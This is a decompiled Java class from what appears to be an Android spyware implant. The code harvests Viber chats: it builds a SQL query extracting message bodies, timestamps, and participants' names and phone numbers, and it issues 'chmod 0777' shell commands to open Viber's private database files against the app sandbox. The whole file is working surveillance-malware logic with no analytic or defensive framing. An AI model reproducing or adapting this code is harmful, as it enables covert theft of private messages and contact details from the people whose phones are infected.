package com.network.android.d;

import android.content.Context;
import android.os.Handler;
import com.network.android.c.a.a;
import com.network.android.p;
import java.util.Map;

public final class i extends p {
    protected static final Map c = new j();
    static String d = "SELECT m._id, m.body, m.date as msg_date, m.conversation_id, pif_sender.participant_type as sender_type, pif_sender.contact_name as sender_name, pif_sender.number as sender_number ";
    static final String e = ((String) c.get("timestamp"));
    static short f = 3108;

    static {
        for (int i = 1; i <= 8; i++) {
            d += ",con.participant_id_" + i + " as id" + i + ", pif" + i + ".participant_type as type" + i + ", pif" + i + ".contact_name as name" + i + ", pif" + i + ".number as number" + i + " ";
        }
        d += "FROM messages as m LEFT OUTER JOIN participants pid_sender ON pid_sender._id = m.participant_id LEFT OUTER JOIN participants_info pif_sender ON pif_sender._id = pid_sender.participant_info_id JOIN conversations con ON m.conversation_id = con._id ";
        for (int i2 = 1; i2 <= 8; i2++) {
            d += String.format("LEFT OUTER JOIN participants_info pif%d ON pif%d._id = con.participant_id_%d ", Integer.valueOf(i2), Integer.valueOf(i2), Integer.valueOf(i2), Integer.valueOf(i2), Integer.valueOf(i2), Integer.valueOf(i2));
        }
    }

    public static void a(Handler handler, Context context, boolean z) {
        try {
            a.a("getViberApp getViberApp start");
            a(handler, context, z, "viber", "/data/data/com.viber.voip/", "/data/data/com.viber.voip/databases/viber_messages", d, "msg_date", "chmod 0777 /data/data/com.viber.voip/;chmod 0777 /data/data/com.viber.voip/databases/viber_messages;chmod 0777 /data/data/com.viber.voip/databases/viber_messages-journal;", e, c, f);
            a.a("getViberApp GetContentIM end");
        } catch (Throwable th) {
            a.a("viber" + "getViberApp GetContentIM exception- " + th.getMessage(), th);
        }
    }
}
